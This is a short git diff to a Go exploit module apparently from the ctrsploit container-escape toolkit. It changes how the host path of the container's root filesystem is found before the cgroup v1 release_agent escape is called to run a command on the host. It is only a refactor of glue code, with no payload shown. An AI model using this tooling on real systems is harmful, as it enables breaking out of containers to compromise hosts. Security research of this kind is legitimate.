@@ -2,7 +2,7 @@ package release_agent
 
 import (
 	cgroupv1_release_agent "github.com/ctrsploit/ctrsploit/exploit/cgroupv1-release_agent"
-	"github.com/ctrsploit/ctrsploit/pkg/graphdriver"
+	"github.com/ctrsploit/ctrsploit/pkg/hostpath"
 	"github.com/ctrsploit/ctrsploit/prerequisite/capability"
 	"github.com/ctrsploit/ctrsploit/prerequisite/cgroups"
 	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
@@ -54,8 +54,7 @@ func Exploit(cmd string) {
 	// TODO: auto select exploit method
 	// TODO: what if the host path is not accessible?
 	//	get the abs path under host of container's rootfs
-	g := graphdriver.GraphDriver{}
-	err := g.Init()
+	rootfs, err := hostpath.RootFs()
 	awesome_error.CheckFatal(err)
-	cgroupv1_release_agent.ReleaseAgent(cmd, g.Rootfs)
+	cgroupv1_release_agent.ReleaseAgent(cmd, rootfs)
 }
